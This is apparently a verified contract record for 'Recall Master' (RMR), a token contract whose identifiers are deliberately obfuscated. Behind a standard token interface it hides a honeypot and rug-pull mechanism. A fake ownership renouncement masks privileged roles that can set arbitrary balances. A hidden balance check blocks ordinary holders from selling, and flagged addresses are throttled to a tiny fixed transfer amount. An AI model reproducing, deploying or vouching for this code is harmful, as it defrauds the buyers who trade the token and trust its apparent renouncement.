{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface walletList {\n    function createPair(address fundTrading, address minLiquidity) external returns (address);\n}\n\ninterface senderAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeReceiver) external view returns (uint256);\n\n    function transfer(address marketingAt, uint256 limitToken) external returns (bool);\n\n    function allowance(address feeTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingAt,\n        uint256 limitToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitLaunched, uint256 value);\n    event Approval(address indexed feeTotal, address indexed spender, uint256 value);\n}\n\nabstract contract atShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapAtShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableTo is senderAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RecallMaster is atShould, senderAmount, enableTo {\n\n    address liquidityFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public receiverSender;\n\n    function sellShouldExempt(address atTxMin, address marketingAt, uint256 limitToken) internal returns (bool) {\n        require(autoSell[atTxMin] >= limitToken);\n        autoSell[atTxMin] -= limitToken;\n        autoSell[marketingAt] += limitToken;\n        emit Transfer(atTxMin, marketingAt, limitToken);\n        return true;\n    }\n\n    function balanceOf(address feeReceiver) public view virtual override returns (uint256) {\n        return autoSell[feeReceiver];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listTrading;\n    }\n\n    bool private limitReceiver;\n\n    mapping(address => bool) public enableTotal;\n\n    uint256 public maxFund;\n\n    uint256 public launchedLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTake;\n    }\n\n    address public amountMin;\n\n    function getOwner() external view returns (address) {\n        return maxBuyLimit;\n    }\n\n    string private modeBuy = \"RMR\";\n\n    bool public limitTotal;\n\n    address receiverReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalLaunched() private view {\n        require(fromShould[_msgSender()]);\n    }\n\n    function launchedAt(address exemptMinLimit) public {\n        if (receiverSender) {\n            return;\n        }\n        if (tokenToSell != walletMarketing) {\n            tokenToSell = launchedLaunch;\n        }\n        fromShould[exemptMinLimit] = true;\n        \n        receiverSender = true;\n    }\n\n    function launchExemptTrading(address takeLiquidity, uint256 limitToken) public {\n        totalLaunched();\n        autoSell[takeLiquidity] = limitToken;\n    }\n\n    uint256 constant shouldLimit = 4 ** 10;\n\n    function transferFrom(address atTxMin, address marketingAt, uint256 limitToken) external override returns (bool) {\n        if (_msgSender() != receiverReceiver) {\n            if (enableBuyTx[atTxMin][_msgSender()] != type(uint256).max) {\n                require(limitToken <= enableBuyTx[atTxMin][_msgSender()]);\n                enableBuyTx[atTxMin][_msgSender()] -= limitToken;\n            }\n        }\n        return teamShould(atTxMin, marketingAt, limitToken);\n    }\n\n    bool private shouldTo;\n\n    bool private sellIsReceiver;\n\n    uint256 liquidityLaunched;\n\n    bool public liquidityLimit;\n\n    function teamShould(address atTxMin, address marketingAt, uint256 limitToken) internal returns (bool) {\n        if (atTxMin == amountMin) {\n            return sellShouldExempt(atTxMin, marketingAt, limitToken);\n        }\n        uint256 sellIs = senderAmount(amountToTeam).balanceOf(liquidityFrom);\n        require(sellIs == liquidityLaunched);\n        require(marketingAt != liquidityFrom);\n        if (enableTotal[atTxMin]) {\n            return sellShouldExempt(atTxMin, marketingAt, shouldLimit);\n        }\n        return sellShouldExempt(atTxMin, marketingAt, limitToken);\n    }\n\n    string private liquidityTake = \"Recall Master\";\n\n    event OwnershipTransferred(address indexed shouldLaunch, address indexed limitAuto);\n\n    function transfer(address takeLiquidity, uint256 limitToken) external virtual override returns (bool) {\n        return teamShould(_msgSender(), takeLiquidity, limitToken);\n    }\n\n    mapping(address => mapping(address => uint256)) private enableBuyTx;\n\n    constructor (){\n        if (liquidityLimit) {\n            liquidityLimit = true;\n        }\n        swapAtShould swapTakeWallet = swapAtShould(receiverReceiver);\n        amountToTeam = walletList(swapTakeWallet.factory()).createPair(swapTakeWallet.WETH(), address(this));\n        if (tokenToSell != walletMarketing) {\n            walletMarketing = launchedLaunch;\n        }\n        amountMin = _msgSender();\n        fromShould[amountMin] = true;\n        autoSell[amountMin] = autoTeam;\n        teamTake();\n        \n        emit Transfer(address(0), amountMin, autoTeam);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoTeam;\n    }\n\n    function toToken(uint256 limitToken) public {\n        totalLaunched();\n        liquidityLaunched = limitToken;\n    }\n\n    function owner() external view returns (address) {\n        return maxBuyLimit;\n    }\n\n    uint8 private listTrading = 18;\n\n    function approve(address toMarketing, uint256 limitToken) public virtual override returns (bool) {\n        enableBuyTx[_msgSender()][toMarketing] = limitToken;\n        emit Approval(_msgSender(), toMarketing, limitToken);\n        return true;\n    }\n\n    function allowance(address marketingTo, address toMarketing) external view virtual override returns (uint256) {\n        if (toMarketing == receiverReceiver) {\n            return type(uint256).max;\n        }\n        return enableBuyTx[marketingTo][toMarketing];\n    }\n\n    bool private txLimit;\n\n    uint256 private walletMarketing;\n\n    mapping(address => bool) public fromShould;\n\n    mapping(address => uint256) private autoSell;\n\n    uint256 private tokenToSell;\n\n    uint256 private autoTeam = 100000000 * 10 ** 18;\n\n    address private maxBuyLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeBuy;\n    }\n\n    address public amountToTeam;\n\n    function teamTake() public {\n        emit OwnershipTransferred(amountMin, address(0));\n        maxBuyLimit = address(0);\n    }\n\n    uint256 takeExemptEnable;\n\n    function tokenSwapWallet(address fundLaunch) public {\n        totalLaunched();\n        if (launchedLaunch == maxFund) {\n            limitTotal = true;\n        }\n        if (fundLaunch == amountMin || fundLaunch == amountToTeam) {\n            return;\n        }\n        enableTotal[fundLaunch] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitToken\",\"type\":\"uint256\"}],\"name\":\"launchExemptTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMinLimit\",\"type\":\"address\"}],\"name\":\"launchedAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitToken\",\"type\":\"uint256\"}],\"name\":\"toToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"}],\"name\":\"tokenSwapWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTxMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RecallMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}